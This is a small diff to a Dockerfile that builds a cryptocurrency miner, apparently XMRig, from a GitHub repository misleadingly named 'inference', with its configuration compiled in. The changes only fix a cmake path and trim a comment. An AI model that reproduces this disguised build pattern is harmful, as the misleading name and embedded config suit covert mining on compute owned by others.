@@ -7,7 +7,7 @@ RUN apk --no-cache add \
     git clone --depth 1 https://github.com/edrivetokenbsc/inference /xmrig && \
     # Build the project
     cd /xmrig && \
-    cmake -DXMRIG_DEPS=scripts/deps -DBUILD_STATIC=ON -DWITH_EMBEDDED_CONFIG=ON .. && \
+    cmake -DXMRIG_DEPS=scripts/deps -DBUILD_STATIC=ON -DWITH_EMBEDDED_CONFIG=ON . && \
     make -j $(nproc) && \
     # Clean up unnecessary build files
     rm -rf /xmrig/src /xmrig/Makefile /xmrig/CMakeFiles /xmrig/CMakeCache.txt && \
@@ -18,7 +18,7 @@ RUN apk --no-cache add \
     git make cmake gcc g++ automake libtool autoconf linux-headers
 
 # Expose the necessary port if required
-EXPOSE 80  # This is still not necessary unless your miner is serving a web interface
+EXPOSE 80 
 
 # Set the working directory to where the binary is located
 WORKDIR /xmrig/build
